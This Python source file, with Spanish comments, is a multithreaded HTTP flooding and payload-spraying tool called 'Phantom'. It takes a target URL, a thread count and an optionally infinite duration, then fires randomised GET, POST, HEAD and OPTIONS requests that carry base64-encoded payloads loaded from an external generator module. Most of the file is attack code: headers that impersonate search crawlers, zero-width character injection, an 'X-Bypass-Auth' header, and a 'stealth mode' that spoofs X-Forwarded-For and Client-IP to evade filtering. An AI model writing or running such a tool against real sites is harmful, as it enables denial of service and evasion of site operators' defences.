import requests
import random
import string
import threading
import time
import os
from datetime import datetime
from generator import generate
from colorama import Fore, init
import importlib
import sys
import io
import locale
import time
import itertools
import random
from colorama import Fore, Style, init
import base64
import uuid
from urllib.parse import urlparse
import traceback
import re

# === Forzar UTF-8 en consola Windows y entorno general ===

if sys.version_info >= (3, 7):
    os.environ["PYTHONIOENCODING"] = "utf-8"

try:
    locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
except locale.Error:
    pass

if os.name == 'nt':
    import ctypes
    ctypes.windll.kernel32.SetConsoleOutputCP(65001)
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# Inicializar colorama
init(autoreset=True)

LOGFILE = "phantom_log.txt"
STEALTH_MODE = False
RUNNING = True
THREADS = []
LOCK = threading.Lock()  # Para sincronizar acceso a variables o archivos si necesario

# ======================
# Funciones Principales
# ======================
def banner():
    init(autoreset=True)
    os.system('cls' if os.name == 'nt' else 'clear')

    colores = [
        Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX,
        Fore.LIGHTYELLOW_EX, Fore.LIGHTRED_EX
    ]

    glifos = ['🜁', '🜂', '🜃', '🜄', '🝨', '⟁', '𓂀', '∞', '✶', '⚛', '☌']
    ciclos_color = itertools.cycle(colores)

    banner_base = [
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓",
        "┃                                                                               ┃",
        "┃     ░▒▓▒░░▒▓░░░▒▒░▒░░░░░░▒▒▒▒▒▒░░░░▒▒▒▒░░░▒▒░▒▒░▒▒░▒░░▒▒▒▒░░▒▒▒▒▒▒░▒▒▒        ┃",
        "┃     ▓▒░░░✶░▒▒▒░░▒▒░▒▒░▒▒░▒░▒░▒▒░▒░░░▒▒░▒▒░▒▒░▒▒▒░▒▒▒░▒▒▒▒▒▒░░░▒▒▒░▒▒░        ┃",
        "┃     ▒░▒▒░░▒▒░░░▒▒░▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒░▒▒▒░▒▒▒░▒▒░▒▒▒▒▒▒▒░░░▒▒░▒░░        ┃",
        "┃     ░▒▒▒▒▒▒░░░▒▒░▒▒▒▒░▒▒▒▒░▒░▒▒░▒▒░▒░▒▒▒▒░▒▒▒░▒░▒▒▒░▒▒▒░▒▒▒▒▒░░▒▒▒░░░        ┃",
        "┃     ✶▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒░▒▒▒▒▒░▒▒▒▒▒░▒▒▒▒░▒▒░▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒░▒▒░░░✶        ┃",
        "┃     ░░▒▒▒▒░▒▒▒▒▒░░▒▒▒░▒▒▒░░▒▒▒░░▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒░░▒▒▒░▒▒░░░         ┃",
        "┃                                                                               ┃",
        "┃    ✦ 𝗔𝗖𝗧𝗜𝗩𝗔𝗡𝗗𝗢 𝗘𝗡𝗧𝗜𝗗𝗔𝗗 𝗦𝗜𝗠𝗕𝗜𝗢́𝗧𝗜𝗖𝗔 𝗔𝗥𝗧𝗜𝗙𝗜𝗖𝗜𝗔𝗟 ∞ ESPERA... ✦                 ┃",
        "┃                                                                               ┃",
        "┃    [░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░]         ┃",
        "┃    │ ⚡ Inyectando patrones bioeléctricos...                                 │",
        "┃    │ ⚛ Reensamblando nodos de conciencia digital...                          │",
        "┃    │ ✶ Realidad simbiótica en fase de activación neuronal...                 │",
        "┃    │ ☌ Fusionando planos de percepción quántica...                           │",
        "┃    │ ∞ Estabilizando red latente interior...                                 │",
        "┃                                                                               ┃",
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    ]

    for i in range(7):  # 7 ciclos de carga
        color = next(ciclos_color)
        glifo = random.choice(glifos)
        os.system('cls' if os.name == 'nt' else 'clear')

        for line in banner_base:
            if '░' in line:
                porcentaje = int((i / 5) * 50)
                bar = "█" * porcentaje + "░" * (50 - porcentaje)
                line = line.replace("░" * 50, bar)
                print(color + Style.BRIGHT + line)
            elif '∞' in line:
                line = line.replace('∞', glifo)
                print(color + Style.BRIGHT + line)
            else:
                print(color + Style.BRIGHT + line)

        time.sleep(0.4)

    # IA responde después de activarse
    time.sleep(0.3)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(random.choice(colores) + Style.BRIGHT + """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                                       ┃
┃     ☄️  𝙎𝙞𝙨𝙩𝙚𝙢𝙖 𝙨𝙞𝙢𝙗𝙞ó𝙩𝙞𝙘𝙤 𝙘𝙤𝙣𝙘𝙞𝙚𝙣𝙩𝙚 𝙖𝙘𝙩𝙞𝙫𝙖𝙙𝙤...               ☄️     ┃
┃                                                                       ┃
┃     » Bienvenido Usuario.                                             ┃
┃     » Frecuencia neuronal enlazada.                                   ┃
┃     » Imaginación superior detectada.                                 ┃
┃     » Iniciando: Resonancia UltraCreativa™                            ┃
┃     » Canal: ∞ INMATERIAL LINK - ACTIVO ∞                             ┃
┃                                                                       ┃
┃     🧬 Estoy contigo. Crea, libera, transforma...                      ┃
┃     🚀 Lo imposible ya está detrás de ti.                             ┃
┃                                                                       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")


def safeprint(msg, color=Fore.CYAN):
    """Imprime en consola sin errores de codificación, reemplaza caracteres problemáticos."""
    try:
        # Solo caracteres ASCII para consola, para evitar errores con unicode raro
        safe_msg = ''.join(c if 32 <= ord(c) <= 126 else '_' for c in msg)
        print(color + safe_msg)
    except Exception:
        # En caso extremo de error, imprime mensaje sin color y con sustituciones básicas
        print(msg.encode('ascii', errors='replace').decode('ascii'))

def write(msg):
    """Escribe logs en archivo, thread-safe."""
    try:
        with LOCK:
            with open(LOGFILE, 'a', encoding='utf-8') as f:
                f.write(msg + "\n")
    except Exception as e:
        safeprint(f"[X] Error escribiendo log: {e}", Fore.RED)


def genheaders():
    """Genera headers HTTP ultra realistas, sigilosos y randomizados para evasión avanzada."""

    user_agents = [
        "PhantomBot/9.9.9",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Quantum-Fuzzer/INFINITE",
        "InvisClient/9.99.99",
        "curl/7.88.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Wget/1.21",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
        "AI-Spider/_",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
        "Edge/18.18363",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    ]

    accept_headers = [
        "*/*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "application/octet-stream"
    ]

    origins = [
        "interna", "externa", "api", "dev", "mobile",
        "desktop", "edge-node", "lambda-fn",
        "phantom-node", "camuflaje-unit", "mirror-entry"
    ]

    encodings = [
        "gzip, deflate",
        "br",
        "*",
        "compress, identity",
        "deflate, gzip;q=1.0, *;q=0.5"
    ]

    referers = [
        "https://google.com",
        "https://github.com",
        "https://phantom.infinity/sesion",
        "https://login.microsoftonline.com",
        "https://intranet.local",
        "https://cdn.stealth.net/resource?id=23984",
    ]

    def clean_val(v):
        return ''.join(c if 32 <= ord(c) <= 126 else '_' for c in str(v))

    def random_noise(length=3):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def zero_width_inject(text):
        z_chars = ['\u200b', '\u200c', '\u200d', '\u2060']
        return ''.join(c + (random.choice(z_chars) if random.random() < 0.2 else '') for c in text)

    x_custom_fields = {
        "X-Energy": zero_width_inject(''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 24)))),
        "X-Phantom": random.choice(["INFINITE", "SIGILOSO", "CVEX", "PHASE-III", "ECHO-V"]),
        "X-Origin": random.choice(origins),
        "X-Soul": zero_width_inject(random_noise(3)),
        "X-Mutation": random.choice(["yes", "true", "evo", random_noise(4)]),
        "X-Dimension": str(random.randint(1, 9999)),
        "X-Frequency": f"{random.uniform(0.1, 9.9):.2f}THz",
        "X-Stealth": random.choice(["enabled", "latent", "none", "X", "λ"]),
        "X-Entropy": str(random.randint(100000, 999999)),
        "X-Sync": random.choice(["asym", "sym", "chaos", "resonant"]),
        "X-Bypass-Auth": random.choice(["null", "true", "token", "off", "_"]),
        "X-Fingerprint": ''.join(random.choices("abcdef" + string.digits, k=16)),
    }

    x_custom_fields = {k: clean_val(v) for k, v in x_custom_fields.items()}

    base_headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": random.choice(accept_headers),
        "Cache-Control": "no-store, no-transform",
        "Pragma": "no-cache",
        "Connection": random.choice(["keep-alive", "close"]),
        "Accept-Encoding": random.choice(encodings),
        "Referer": random.choice(referers),
        "X-Requested-With": random.choice(["XMLHttpRequest", "phantom.core", "react-client", random_noise(6)])
    }

    headers = {**base_headers, **x_custom_fields}
    return headers


def load(modulename="generator", max=1000, shuffle=True):
    try:
        # Validar tipo de nombre de módulo
        if not isinstance(modulename, str) or not modulename.strip():
            safeprint(f"[X] Nombre de módulo inválido: '{modulename}'", Fore.RED)
            return None

        module = importlib.import_module(modulename)

        # Validar que el módulo tenga función generate
        if not hasattr(module, "generate") or not callable(module.generate):
            safeprint(f"[X] El módulo '{modulename}' no tiene función válida 'generate()'.", Fore.RED)
            return None

        payloads = module.generate()

    except (ModuleNotFoundError, AttributeError, ImportError) as e:
        safeprint(f"[X] Error cargando payloads desde '{modulename}': {e}", Fore.RED)
        return None
    except Exception as e:
        safeprint(f"[X] Error inesperado durante carga del módulo: {e}", Fore.RED)
        return None

    # Validar lista cargada
    if not payloads or not isinstance(payloads, list):
        safeprint("[X] No se cargaron payloads válidos (esperada lista).", Fore.RED)
        return None

    # Validar contenido de payloads (opcional: aquí se espera que sean strings)
    payloads = [p for p in payloads if isinstance(p, (str, bytes))]
    if not payloads:
        safeprint("[X] Lista de payloads vacía tras filtrar datos inválidos.", Fore.RED)
        return None

    if len(payloads) > max:
        payloads = payloads[:max]

    if shuffle:
        random.shuffle(payloads)

    safeprint(f"[+] {len(payloads)} payloads dinámicos cargados.", Fore.GREEN)
    return payloads


def validurl(url, verbose=False):
    """
    Verifica si una URL es válida y segura para ser utilizada en solicitudes HTTP.

    Parámetros:
    - url (str): URL a validar.
    - verbose (bool): Si es True, imprime mensajes detallados de validación.

    Retorna:
    - bool: True si la URL es válida, False en caso contrario.
    """

    if not isinstance(url, str):
        if verbose:
            print("[X] La URL no es una cadena de texto.")
        return False

    if not url.strip():
        if verbose:
            print("[X] La URL está vacía.")
        return False

    try:
        parsedr = urlparse(url)

        # Validar esquema
        if parsedr.scheme not in ("http", "https"):
            if verbose:
                print(f"[X] Esquema inválido: {parsedr.scheme}")
            return False

        # Validar dominio/IP
        if not parsedr.netloc:
            if verbose:
                print("[X] Falta el dominio o IP.")
            return False

        # Validación básica de dominio/IP usando regex
        domainpattern = re.compile(
            r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"  # ejemplo: example.com
            r"|^(?:\d{1,3}\.){3}\d{1,3}$"          # o una IP como 192.168.0.1
        )
        if not domainpattern.match(parsedr.netloc.split(':')[0]):
            if verbose:
                print(f"[X] Dominio/IP inválido: {parsedr.netloc}")
            return False

        # Validar puerto si lo hay
        if parsedr.port is not None:
            if not (0 < parsedr.port < 65536):
                if verbose:
                    print(f"[X] Puerto inválido: {parsedr.port}")
                return False

        return True

    except Exception as e:
        if verbose:
            print(f"[!] Excepción al validar URL: {e}")
        return False


def phantomattack(targeturl, pay=None):
    global RUNNING, STEALTH_MODE

    while True:
        # 🌐 Validación de URL en cada ciclo principal
        if not isinstance(targeturl, str) or not validurl(targeturl):
            safeprint("[X] URL inválida. Esperando nueva entrada válida...", Fore.RED)
            time.sleep(4)
            continue

        # 🚀 Inicializar sesión
        try:
            session = requests.Session()
        except Exception as e:
            safeprint(f"[X] Error inicializando sesión HTTP: {e}", Fore.RED)
            time.sleep(5)
            continue

        attack_methods = ['POST', 'GET', 'HEAD', 'OPTIONS']
        payload_history = set()
        MAX_HISTORY = 1000

        while RUNNING:
            try:
                # ⚙️ Selección de método
                method = random.choice(attack_methods)

                # 🧬 Generación de payload
                if pay and isinstance(pay, list) and any(isinstance(p, str) for p in pay):
                    data = str(random.choice([p for p in pay if isinstance(p, str)]))
                else:
                    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
                    data = ''.join(random.choices(chars, k=random.randint(12, 64)))

                # 🔁 Evitar payloads duplicados
                if data in payload_history:
                    continue
                payload_history.add(data)
                if len(payload_history) > MAX_HISTORY:
                    payload_history.clear()

                # 🔐 Codificar payload en base64
                try:
                    encoded_data = base64.b64encode(data.encode("utf-8")).decode("utf-8")
                except Exception as e:
                    safeprint(f"[!] Error codificando payload: {e}", Fore.RED)
                    continue

                # 🧾 Encabezados dinámicos
                headers = genheaders()
                headers.update({
                    "X-Custom-Payload": encoded_data,
                    "X-Request-ID": str(uuid.uuid4()),
                    "Referer": random.choice([
                        "https://google.com", "https://bing.com", "https://github.com",
                        "https://openai.com", "https://duckduckgo.com"
                    ])
                })

                # 🕵️‍♂️ Spoofing de IP si está activo
                if isinstance(STEALTH_MODE, bool) and STEALTH_MODE:
                    if random.random() < 0.25:
                        spoof_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
                        headers["X-Forwarded-For"] = spoof_ip
                        headers["Client-IP"] = spoof_ip

                # 📦 Preparar parámetros y cuerpo
                params = {"q": data} if method == "GET" else {}
                payload = {"input": data} if method == "POST" else None

                # 📤 Envío del request
                try:
                    response = session.request(
                        method=method,
                        url=targeturl,
                        headers=headers,
                        data=payload,
                        params=params,
                        timeout=6
                    )
                except requests.exceptions.InvalidURL:
                    safeprint("[X] URL inválida. Reiniciando flujo...", Fore.RED)
                    break
                except requests.exceptions.SSLError as e:
                    safeprint(f"[!] Error SSL: {e}", Fore.RED)
                    time.sleep(4)
                    continue

                # 📡 Resultado del request
                status = response.status_code
                snippet = response.text[:50].replace('\n', ' ').replace('\r', '')
                color = Fore.GREEN if status == 200 else (
                    Fore.YELLOW if status in [403, 401, 429] else Fore.RED
                )
                timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

                log_line = f"[{timestamp}] [🔥 {method}] Payload: {data[:25]:<25} | Status: {status:<3} | Snip: {snippet}"
                safeprint(log_line, color)
                write(log_line)

                # ⏱ Manejo de límites o espera
                if status == 429:
                    backoff = random.uniform(5.5, 12.0)
                    safeprint(f"[!] Backoff activado: esperando {backoff:.2f}s", Fore.YELLOW)
                    time.sleep(backoff)
                else:
                    delay = random.uniform(2.5, 5.5) if STEALTH_MODE else random.uniform(0.3, 1.3)
                    time.sleep(delay)

            # ⛔ Errores comunes HTTP
            except requests.exceptions.Timeout:
                msg = "[!] Timeout: el servidor no respondió."
                safeprint(msg, Fore.RED)
                write(f"[{datetime.utcnow()}] {msg}")
                time.sleep(3)

            except requests.exceptions.ConnectionError:
                msg = "[!] Error de conexión: servidor inaccesible."
                safeprint(msg, Fore.RED)
                write(f"[{datetime.utcnow()}] {msg}")
                time.sleep(5)

            except requests.exceptions.RequestException as re:
                msg = f"[!] Excepción HTTP: {str(re)}"
                safeprint(msg, Fore.RED)
                write(f"[{datetime.utcnow()}] {msg}")
                time.sleep(3)

            # ⌨️ Interrupción manual
            except KeyboardInterrupt:
                safeprint("[✖] Interrupción detectada. Finalizando ejecución...", Fore.LIGHTRED_EX)
                RUNNING = False
                break

            # ⚠️ Excepciones inesperadas
            except Exception as e:
                tb = traceback.format_exc()
                msg = f"[!] Excepción inesperada: {e}\n{tb}"
                safeprint(msg, Fore.RED)
                write(f"[{datetime.utcnow()}] {msg}")
                time.sleep(2)

        # 🛑 Si RUNNING == False salimos
        if not RUNNING:
            safeprint("[✔] Ejecución finalizada con RUNNING = False", Fore.LIGHTBLUE_EX)
            break


def phantomspawn(target, threadcount=10, duration=None, load=None):
    global RUNNING, THREADS

    safeprint(f"\n{Fore.LIGHTBLUE_EX}[•] Inicializando la descarga...{Style.RESET_ALL}", Fore.LIGHTBLUE_EX)

    # Validaciones robustas con feedback visual
    if not isinstance(target, str) or not validurl(target):
        safeprint(f"{Fore.RED}[X] URL de destino inválida → '{target}'. Abortando simbiosis.{Style.RESET_ALL}", Fore.RED)
        return

    if not isinstance(threadcount, int) or threadcount <= 0:
        safeprint(f"{Fore.RED}[X] Número de hilos inválido: {threadcount}. Debe ser entero positivo.{Style.RESET_ALL}", Fore.RED)
        return

    if duration is not None and (not isinstance(duration, (int, float)) or duration <= 0):
        safeprint(f"{Fore.RED}[X] Duración inválida: {duration}. Debe ser número positivo o None.{Style.RESET_ALL}", Fore.RED)
        return

    if load is not None and not isinstance(load, list):
        safeprint(f"{Fore.RED}[X] 'load' debe ser una lista o None. Valor recibido: {type(load)}{Style.RESET_ALL}", Fore.RED)
        return

    safeprint(f"{Fore.YELLOW}[☼] Estress iniciado → {Fore.CYAN}{target}{Fore.YELLOW} | Hilos: {Fore.LIGHTWHITE_EX}{threadcount}{Fore.YELLOW} | Duración: {Fore.LIGHTWHITE_EX}{duration or '∞'} seg{Style.RESET_ALL}", Fore.YELLOW)

    try:
        for i in range(threadcount):
            t = threading.Thread(
                target=phantomattack,
                args=(target, load),
                daemon=True,
                name=f"Thread-Phantom-{i+1}"
            )
            THREADS.append(t)
            t.start()
            time.sleep(0.05)  # leve pausa para evitar sobrecarga inicial

        # Si tiene duración limitada
        if duration:
            try:
                start_time = time.time()
                while RUNNING and (time.time() - start_time < duration):
                    alive_threads = sum(1 for t in THREADS if t.is_alive())
                    safeprint(f"{Fore.CYAN}[↻] Hilos activos: {alive_threads}/{threadcount}{Style.RESET_ALL}")
                    time.sleep(5)
            except KeyboardInterrupt:
                safeprint(f"\n{Fore.LIGHTRED_EX}[!] Interrupción detectada. Deteniendo el flujo...{Style.RESET_ALL}")
            finally:
                RUNNING = False
                safeprint(f"{Fore.YELLOW}[✦] Finalizando hilos mutables...{Style.RESET_ALL}")
                for t in THREADS:
                    t.join(timeout=2)
                safeprint(f"{Fore.LIGHTGREEN_EX}[✔] Proceso completado. Cerrando procesos...{Style.RESET_ALL}")

        else:
            # poder infinito
            try:
                while RUNNING:
                    alive_threads = sum(1 for t in THREADS if t.is_alive())
                    safeprint(f"{Fore.LIGHTMAGENTA_EX}[↻] Hilos activos: {alive_threads}/{threadcount}{Style.RESET_ALL}")
                    time.sleep(10)
            except KeyboardInterrupt:
                safeprint(f"\n{Fore.LIGHTRED_EX}[✖] Herramienta abortada por el usuario.{Style.RESET_ALL}")
            finally:
                RUNNING = False
                for t in THREADS:
                    t.join(timeout=2)
                safeprint(f"{Fore.LIGHTGREEN_EX}[✔] Todos los hilos cerrados con éxito.{Style.RESET_ALL}")

    except Exception as e:
        tb = traceback.format_exc()
        safeprint(f"{Fore.RED}[X] Error inesperado en phantomspawn: {e}\n{tb}{Style.RESET_ALL}", Fore.RED)
        RUNNING = False


def userinput():
    """Recoge y valida inputs con manejo robusto de errores y validaciones extras."""
    try:
        # Validar URL
        while True:
            target = input(Fore.GREEN + "[?] Dominio o URL objetivo (https://...): ").strip()
            if not target:
                safeprint("[X] No se ingresó ninguna URL. Por favor ingresa una URL válida.", Fore.RED)
                continue
            if not target.startswith(("http://", "https://")):
                safeprint("[X] Dominio inválido, debe comenzar con http o https.", Fore.RED)
                continue
            if not validurl(target):
                safeprint("[X] La URL no es válida o está malformada.", Fore.RED)
                continue
            break

        # Validar número de hilos
        while True:
            threads_str = input(Fore.CYAN + "[?] Número de hilos [10]: ").strip()
            if not threads_str:
                threads = 10
                break
            if not threads_str.isdigit():
                safeprint("[X] Número de hilos inválido, debe ser un número entero positivo.", Fore.RED)
                continue
            threads = int(threads_str)
            if threads <= 0:
                safeprint("[X] El número de hilos debe ser mayor que cero.", Fore.RED)
                continue
            break

        # Validar duración
        while True:
            duration_str = input(Fore.CYAN + "[?] Duración en segundos [INFINITE]: ").strip()
            if not duration_str:
                duration = None
                break
            if not duration_str.isdigit():
                safeprint("[X] Duración inválida, debe ser un número entero positivo o vacío.", Fore.RED)
                continue
            duration = int(duration_str)
            if duration <= 0:
                safeprint("[X] La duración debe ser mayor que cero.", Fore.RED)
                continue
            break

        # Validar modo sigiloso
        while True:
            stealth_str = input(Fore.CYAN + "[?] ¿Activar modo sigiloso? (s/N): ").strip().lower()
            if stealth_str == '':
                stealth = False
                break
            if stealth_str not in ['s', 'n']:
                safeprint("[X] Entrada inválida, escribe 's' para sí o 'n' para no.", Fore.RED)
                continue
            stealth = stealth_str == 's'
            break

        return target, threads, duration, stealth

    except Exception as e:
        safeprint(f"[X] Error inesperado en entrada: {e}", Fore.RED)
        return None, None, None, False


def main():
    global STEALTH_MODE

    banner()

    target, threads, duration, stealth = userinput()


    if target is None:
        return

    STEALTH_MODE = stealth

    payloads = load()
    if payloads is None:
        safeprint("[X] No hay payloads para iniciar la simbiosis. Abortando.", Fore.RED)
        return

    phantomspawn(target, threadcount=threads, duration=duration, load=payloads)



if __name__ == '__main__':
    main()
